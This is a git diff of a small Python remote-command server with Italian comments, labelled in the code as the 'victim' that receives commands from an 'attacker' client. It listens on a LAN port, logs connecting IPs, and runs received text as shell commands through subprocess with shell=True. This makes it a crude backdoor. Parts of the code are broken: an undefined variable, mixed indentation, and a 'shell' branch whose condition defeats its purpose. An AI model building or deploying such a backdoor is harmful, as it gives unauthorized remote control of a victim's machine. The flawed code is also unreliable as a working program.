@@ -9,7 +9,7 @@ import os
 import subprocess
 import shlex
 
-###### BISOGNA CREARE UN FILE CLIENT ######
+###### SERVER (VITTIMA) CHE RICEVE I COMANDI DAL CLIENT (ATTACCANTE) ######
 
 HOST = '192.168.1.119'  # localhost
 PORT = 8888  # Porta da usare
@@ -40,7 +40,7 @@ i = -1  # Perche' quando andiamo ad aggiungere il primo utente esso sara' il num
 IP_Utenti = [] # Lista degli IP degli utenti connessi al server
 
 
-def invia_dati(conn):
+def ricevi_dati(conn):
     global i
     path = "/home/matteo"
     while True:
@@ -58,32 +58,27 @@ def invia_dati(conn):
 			#print(i)
 		elif (dati.strip() == "mostra"):
 			subprocess.call(["ls"])
-            #args = shlex.split(dati)
-            #print(args)
-            #p = subprocess.Popen(args)
-            #print(p)
-            #todel = input("Quale cartella vuoi eliminare...: ")
-            #print("execpath: " + os.get_exec_path())
-            #print(os.listdir(path))            
-            #pro = subprocess.Popen(shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-            #print(pro)
-            #os.rmdir("/home/matteo/Scrivania/REM")
+
 		elif (dati.strip() == "help"):
 			print("pwd, ps, goto, mostra")
+
 		elif (dati.strip() == "pwd"):
 			subprocess.call(["pwd"])
+
 		elif (dati.strip() == "ps"):
 			subprocess.call(["ps"])
+
 		elif (dati.strip() == "goto"):
 		#	go = raw_input("Cartella dove andare: ")
 			subprocess.call(["cd " + go])
 			print("Siamo ora in: " + subprocess.call(["pwd"]))
+
 		elif (dati.strip() == "shell"):
 			if len(dati.strip()) > 1:
-				proc2 = subprocess.Popen(dati.strip(), shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE)
+				proc2 = subprocess.Popen(dati.strip(), shell = True,
+                    stdout = subprocess.PIPE,
+                    stderr = subprocess.PIPE,
+                    stdin = subprocess.PIPE)
 				output = proc2.stdout.read() + proc2.stderr.read()
 			else:
 				output = 'args must follow "shell"'
@@ -97,8 +92,8 @@ while 1:
     conn, addr = s.accept() # CAUSA DEL BUG
     #utenti.append(addr[0])
     #utenti[addr] = conn
-    var_ip = conn.getpeername()
-    IP_Utenti.append(var_ip)
+    var_ip = conn.getpeername() # PRENDIAMO L'IP DELL'UTENTE APPENA CONNESSO...
+    IP_Utenti.append(var_ip) # ...E LO AGGIUNGIAMO ALLA LISTA DEGLI UTENTI COLLEGATI AL SERVER
     i += 1
     print(i)
     print("\n")
@@ -106,5 +101,5 @@ while 1:
 
     print("Numero utenti connessi lista: " + str(len(IP_Utenti)))
     print("IP utenti connessi: " + str(IP_Utenti))
-    start_new_thread(invia_dati, (conn,))
+    start_new_thread(ricevi_dati, (conn,))
 s.close()
